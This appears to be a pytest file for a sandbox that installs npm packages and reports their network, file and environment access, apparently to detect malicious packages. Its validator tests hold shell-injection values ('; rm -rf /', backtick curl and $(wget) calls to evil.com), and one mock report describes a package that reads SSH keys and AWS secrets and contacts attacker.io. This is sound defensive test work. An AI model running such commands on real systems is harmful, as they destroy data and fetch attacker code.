"""
Tests for api/sandbox.py — Daytona sandbox lifecycle manager.
Mocks the daytona_sdk to test all code paths without live sandboxes.
"""

import sys
import os
import json
import pytest
from unittest.mock import MagicMock, patch

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from sandbox import _validate_package_name, _create_and_run, run_in_sandbox
from models import RuntimeReport


# ─────────────────────────────────────────────────────────────────────────────
# _validate_package_name
# ─────────────────────────────────────────────────────────────────────────────

class TestValidatePackageName:
    def test_valid_simple_name(self):
        _validate_package_name("lodash")  # Should not raise

    def test_valid_scoped_package(self):
        _validate_package_name("@scope/my-pkg")  # Should not raise

    def test_valid_name_with_dots_and_dashes(self):
        _validate_package_name("my-package.js")  # Should not raise

    def test_empty_string_raises(self):
        with pytest.raises(ValueError, match="length"):
            _validate_package_name("")

    def test_none_raises(self):
        with pytest.raises((ValueError, TypeError)):
            _validate_package_name(None)

    def test_too_long_raises(self):
        with pytest.raises(ValueError, match="length"):
            _validate_package_name("a" * 215)

    def test_exactly_214_chars_passes(self):
        _validate_package_name("a" * 214)  # Should not raise

    def test_path_traversal_raises(self):
        with pytest.raises(ValueError, match="format"):
            _validate_package_name("../evil")

    def test_shell_injection_semicolon_raises(self):
        with pytest.raises(ValueError, match="format"):
            _validate_package_name("; rm -rf /")

    def test_shell_injection_backtick_raises(self):
        with pytest.raises(ValueError, match="format"):
            _validate_package_name("`curl evil.com`")

    def test_shell_injection_dollar_raises(self):
        with pytest.raises(ValueError, match="format"):
            _validate_package_name("$(wget evil.com)")

    def test_uppercase_letters_rejected(self):
        with pytest.raises(ValueError, match="format"):
            _validate_package_name("MyPackage")

    def test_space_in_name_rejected(self):
        with pytest.raises(ValueError, match="format"):
            _validate_package_name("my package")

    def test_double_slash_rejected(self):
        with pytest.raises(ValueError, match="format"):
            _validate_package_name("@scope//pkg")


# ─────────────────────────────────────────────────────────────────────────────
# _create_and_run — output parsing
# ─────────────────────────────────────────────────────────────────────────────

def _make_mock_daytona(stdout_output):
    """Build a mock daytona SDK that returns the given stdout from process.exec."""
    mock_result = MagicMock()
    mock_result.result = stdout_output

    mock_process = MagicMock()
    mock_process.exec.return_value = mock_result

    mock_fs = MagicMock()

    mock_sandbox = MagicMock()
    mock_sandbox.process = mock_process
    mock_sandbox.fs = mock_fs

    mock_daytona_instance = MagicMock()
    mock_daytona_instance.create.return_value = mock_sandbox

    return mock_daytona_instance


VALID_HARNESS_OUTPUT = json.dumps({
    "package": "lodash",
    "networkCalls": [],
    "fileSystemWrites": [],
    "fileSystemReads": [],
    "envVarAccess": [],
    "cpuAnomaly": False,
    "cpuUserRatioMax": 0.02,
    "errors": [],
    "timestamp": 1700000000000,
})

MALICIOUS_HARNESS_OUTPUT = json.dumps({
    "package": "evil-pkg",
    "networkCalls": [{"protocol": "https", "host": "attacker.io", "port": 443, "path": "/", "time": 1000}],
    "fileSystemWrites": [],
    "fileSystemReads": [{"path": "/home/user/.ssh/id_rsa", "suspicious": True, "time": 1001}],
    "envVarAccess": [{"key": "AWS_SECRET_KEY", "time": 1002}],
    "cpuAnomaly": False,
    "cpuUserRatioMax": 0.05,
    "errors": [],
    "timestamp": 1700000001000,
})


class TestCreateAndRun:
    def _run(self, package_name, stdout_output, daytona_mock=None):
        if daytona_mock is None:
            daytona_mock = _make_mock_daytona(stdout_output)

        with patch.dict("sys.modules", {"daytona_sdk": MagicMock(
            Daytona=MagicMock(return_value=daytona_mock),
            CreateSandboxFromImageParams=MagicMock(),
        )}):
            return _create_and_run(package_name)

    def test_valid_json_output_parsed_correctly(self):
        result = self._run("lodash", VALID_HARNESS_OUTPUT)
        assert result["package"] == "lodash"
        assert result["networkCalls"] == []
        assert result["cpuUserRatioMax"] == pytest.approx(0.02)

    def test_malicious_json_output_parsed_correctly(self):
        result = self._run("evil-pkg", MALICIOUS_HARNESS_OUTPUT)
        assert len(result["networkCalls"]) == 1
        assert result["networkCalls"][0]["host"] == "attacker.io"
        assert len(result["fileSystemReads"]) == 1
        assert result["fileSystemReads"][0]["suspicious"] is True

    def test_no_json_output_returns_error_dict(self):
        result = self._run("bad-output-pkg", "npm install log output only, no JSON here")
        assert result["package"] == "bad-output-pkg"
        assert len(result["errors"]) > 0
        assert "no JSON output" in result["errors"][0].lower() or "harness" in result["errors"][0].lower()

    def test_empty_output_returns_error_dict(self):
        result = self._run("silent-pkg", "")
        assert "errors" in result
        assert len(result["errors"]) > 0

    def test_json_embedded_in_other_output_extracted(self):
        mixed_output = f"npm notice created a lockfile\nnpm WARN deprecated\n{VALID_HARNESS_OUTPUT}\n"
        result = self._run("lodash", mixed_output)
        assert result["package"] == "lodash"
        assert result["networkCalls"] == []

    def test_exception_returns_error_dict(self):
        mock_daytona = MagicMock()
        mock_daytona.create.side_effect = RuntimeError("Daytona API unreachable")

        result = self._run("some-pkg", "", daytona_mock=mock_daytona)
        assert result["package"] == "some-pkg"
        assert "Sandbox error" in result["errors"][0]
        assert "Daytona API unreachable" in result["errors"][0]

    def test_sandbox_deleted_on_success(self):
        mock_daytona = _make_mock_daytona(VALID_HARNESS_OUTPUT)

        with patch.dict("sys.modules", {"daytona_sdk": MagicMock(
            Daytona=MagicMock(return_value=mock_daytona),
            CreateSandboxFromImageParams=MagicMock(),
        )}):
            _create_and_run("lodash")

        mock_daytona.delete.assert_called_once()

    def test_sandbox_deleted_on_exception(self):
        mock_daytona = MagicMock()
        mock_sandbox = MagicMock()
        mock_daytona.create.return_value = mock_sandbox
        mock_sandbox.process.exec.side_effect = RuntimeError("Exec failed")

        with patch.dict("sys.modules", {"daytona_sdk": MagicMock(
            Daytona=MagicMock(return_value=mock_daytona),
            CreateSandboxFromImageParams=MagicMock(),
        )}):
            _create_and_run("some-pkg")

        mock_daytona.delete.assert_called_once_with(mock_sandbox)

    def test_invalid_package_name_raises_before_sandbox(self):
        mock_daytona = _make_mock_daytona(VALID_HARNESS_OUTPUT)

        with patch.dict("sys.modules", {"daytona_sdk": MagicMock(
            Daytona=MagicMock(return_value=mock_daytona),
            CreateSandboxFromImageParams=MagicMock(),
        )}):
            result = _create_and_run("; rm -rf /")

        # Should return error dict, not crash; sandbox should NOT be created
        assert "Sandbox error" in result["errors"][0] or "Invalid" in result["errors"][0]
        mock_daytona.create.assert_not_called()


# ─────────────────────────────────────────────────────────────────────────────
# run_in_sandbox — async wrapper
# ─────────────────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
class TestRunInSandbox:
    async def test_returns_runtime_report_model(self):
        raw = json.loads(VALID_HARNESS_OUTPUT)
        with patch("sandbox._create_and_run", return_value=raw):
            result = await run_in_sandbox("lodash")
        assert isinstance(result, RuntimeReport)
        assert result.package == "lodash"

    async def test_handles_null_cpu_ratio(self):
        raw = {
            "package": "some-pkg",
            "networkCalls": [],
            "fileSystemWrites": [],
            "fileSystemReads": [],
            "envVarAccess": [],
            "cpuAnomaly": False,
            "cpuUserRatioMax": None,  # null from harness
            "errors": [],
            "timestamp": 0,
        }
        with patch("sandbox._create_and_run", return_value=raw):
            result = await run_in_sandbox("some-pkg")
        assert result.cpuUserRatioMax == 0.0

    async def test_handles_missing_fields_with_defaults(self):
        raw = {"package": "minimal-pkg"}  # all other fields missing
        with patch("sandbox._create_and_run", return_value=raw):
            result = await run_in_sandbox("minimal-pkg")
        assert result.networkCalls == []
        assert result.errors == []
        assert result.cpuAnomaly is False

    async def test_error_dict_produces_runtime_report_with_errors(self):
        raw = {
            "package": "error-pkg",
            "networkCalls": [],
            "fileSystemWrites": [],
            "fileSystemReads": [],
            "envVarAccess": [],
            "cpuAnomaly": False,
            "cpuUserRatioMax": 0.0,
            "errors": ["Sandbox error: connection refused"],
            "timestamp": 0,
        }
        with patch("sandbox._create_and_run", return_value=raw):
            result = await run_in_sandbox("error-pkg")
        assert len(result.errors) == 1
        assert "connection refused" in result.errors[0]
